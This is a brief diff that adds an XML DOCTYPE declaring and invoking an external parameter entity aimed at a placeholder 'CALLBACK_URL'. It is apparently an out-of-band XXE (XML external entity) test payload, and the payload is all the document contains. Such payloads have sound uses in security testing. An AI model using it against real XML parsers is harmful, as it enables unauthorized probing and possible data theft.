@@ -1,0 +1,4 @@
+<!DOCTYPE root [
+  <!ENTITY % xxe PUBLIC "RandomIdentifier" "http://CALLBACK_URL">
+  %xxe;
+]>
